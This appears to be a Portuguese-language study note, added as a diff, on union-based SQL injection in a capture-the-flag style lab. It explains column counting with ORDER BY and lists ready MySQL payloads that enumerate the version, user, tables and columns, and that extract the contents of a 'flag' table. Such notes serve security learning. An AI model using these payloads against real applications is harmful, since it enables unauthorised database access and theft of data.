@@ -1,0 +1,40 @@
+COMO ACONTECE ESSA VULNERABILIDADE? -> Essa vulnerabilidade ocorre quando podemos afetar uma query da aplicação diretamtente, podendo assim, interferir diretamente no banco de dados da aplicação. Afetando assim uma query que já está rodando na aplicação, podemos inferir diretamente até em outras tabelas, de outros bancos de dados e etc...
+-----------------------------------------------------------------------------------
+COMO DETECTAR A QUANTIDADE DE COLUNAS QUE ESTÃO SENDO SELECIONADAS PELO BACKEND? ->
+podemos tentar ordenar os resultados utilizando o order by e um número, assim iremos conseguir saber quantas colunas temos no banco de dados da aplicação, quando o número inserido for maior que o número real contido na aplicação, iremos ter um provavel bug na aplicação e ela não irá retornar nada para nós.
+-----------------------------------------------------------------------------------
+COMO SABER QUAIS SÃO AS COLUNAS DE CADA COISA NA APLICAÇÃO? -> Ao injetarmos a seguinte payload: ' union select 1,2,3,4;#
+
+estamos inferindo diretamente na aplicação, só que a nossa query injetada está dizendo ao backend que queremos unir as consultas porém com as colunas 1,2,3 e 4 selecionadas. A aplicação então acabou criando mais um produto, mesmo o banco só tendo 3. Com isso conseguimos inferir e descobrir quais colunas são representadas por cada número da consulta, o 2 por exemplo é o titulo, o 3 é a descrição.
+-----------------------------------------------------------------------------------DESCOBRINDO VERSÃO DO BANCO DE DADOS, USUARIO E MUITO MAIS -> Para fazermos isso, podemos utilizar por exemplo a segunda coluna da tabela que já sabemos ser do tipo texto, podemos então injetar a seguinte payload: 'union select 1,@@version,3,4;#
+dessa forma onde for a segunda linha da tabela irá ocorrer uma injeção maliciosa e nos retornar qual a versão do banco está rodando. 
+
+VERSÃO DO BANCO: 'union select 1,@@version,3,4;#
+
+NOME DO BANCO: 'union select 1,database(),3,4;# (o nome é cs)
+
+NOME DO USUARIO: 'union select 1,user(),3,4;# (webapp@localhost)
+
+TABELAS DENTRO DO BANCO DE DADOS: 'union select 1,table_name,3,4 from information_schema.tables where table_schema = 'cs';#
+
+OBTENDO O NOME DAS COLUNAS DO BANCO -> 'union select 1, column_name,3,4 from information_schema.columns where table_name = 'flag'#
+
+OBTENDO A FLAG DA TABELA FLAG -> 'union select 1, name,id,4 from flag #
+-----------------------------------------------------------------------------------OUTRAS FORMAS DE SE FAZER O MESMO ATAQUE -> Podemos fazer o ataque todo de maneiras diferentes, por exemplo:
+
+ENUMERAR QUANTAS COLUNAS A APLICAÇÃO CONSULTA: 'union select null,null,null,null#
+
+· Dessa forma podemos enumerar quantas colunas a aplicação consulta no DB.
+
+ENUMERAR AS COLUNAS DE TEXTO VÁLIDAS: 'union select 'a',null,null,null#
+
+· Alterando o 'a' para os outros nulls, podemos saber qual parte da consulta retorna uma string (muito util para retornarmos informações e fazermos consultas utilizandos as strings)
+
+OBTENDO A FLAG DA TABELA FLAG UTILIZANDO PARAMETROS NULL: 'union select null,name,id,null from flag#
+-----------------------------------------------------------------------------------COISAS QUE DEVEMOS NOS ATENTAR -> Devemos nos atentar ao enumerar as colunas, quais delas estão retornando diretamente para nós, por exemplo, no laboratorio temos as colunas 2 e 3, que são respectivamente o nome dos produtos e a descrição. Podemos confirmar isso utilizando a seguinte payload: 
+
+'union select null,'a','b',null,null#
+
+Dessa forma o a irá aparecer no nome e o b irá aparecer na descrição, assim então podemos utilzar essas duas colunas para retornarmos o valor da flag.
+
+* Outra coisa que devemos nos atentar é para a difenrença dos bancos de dados, de comentarios, de tabelas informativas e etc. Dessa forma é sempre bom consultar a documentação do banco após identificação da ferramenta.
